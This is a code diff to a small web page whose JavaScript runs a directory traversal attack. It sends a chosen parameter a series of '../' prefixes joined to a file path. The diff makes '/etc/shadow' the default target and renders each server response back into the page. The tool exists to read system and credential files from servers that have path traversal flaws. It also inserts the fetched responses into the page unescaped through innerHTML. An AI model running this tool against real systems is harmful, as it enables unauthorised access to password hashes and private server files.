@@ -38,6 +38,7 @@
         </div>
         <script> 
             const tests = [
+                './',
                 '../',
                 '../../',
                 '../../../',
@@ -112,7 +113,8 @@
                 const url           = elem("#formurl").value ?? null
                 const method        = elem("#formmethod").value ?? null
                 let param           = elem("#formparam").value ?? null
-                let filename        = elem("#formdumpfile").value ?? null
+                let filename        = elem("#formdumpfile").value ?? '/etc/shadow'
+                console.info(url,method,param,filename)
                 injection(url,param,method,filename)
             }
 
@@ -120,13 +122,14 @@
             {
                 if (url && method && param && filename) 
                 {
+                    elem("#render").innerHTML = ``
                     const params    = {}
                     tests.map(
                         test=>{
                             params[param]   = `${test}${filename}`
                             const req = custom_req(url) 
                             req[method](params, res => {
-                                elem("#render").innerHTML += <h2></h2><div>${req.req.response}</div>
+                                elem("#render").innerHTML += `<h2>${test}${filename}</h2><div>${req.req.response}</div>`
                             })
                         }
                     )
